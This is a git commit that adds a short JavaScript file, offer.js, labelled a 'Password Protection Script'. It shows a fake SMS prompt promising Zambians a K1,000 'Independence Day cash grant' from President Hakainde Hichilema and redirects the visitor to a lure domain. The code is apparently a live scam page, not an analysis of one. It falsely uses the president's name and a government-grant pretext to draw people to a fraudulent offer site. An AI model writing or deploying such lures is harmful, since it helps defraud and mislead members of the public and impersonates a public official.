4cc4ca7f6f56d2e52b0f1a9914941a4727b14cc2
essac5 <154714847+essac5@users.noreply.github.com>
2024-10-20 11:51:23 +0100

    Update and rename backkey.js to offer.js

---
+++ offer.js
@@ -0,0 +1,6 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW K1,000'
+password=prompt('SMS: Congratulations You are qualify for PRESIDENT Hakainde Hichilema K1,000 INDEPENDENCE DAY CASH GRANT FOR ZAMBIANS, Kindly Press OK to Withdraw Cash Prize ','WITHDRAW K1,000');
+if (password != 'WITHDRAW K1,000') {
+location.href='https://zambia-independence.programs.lat/offer';
+}
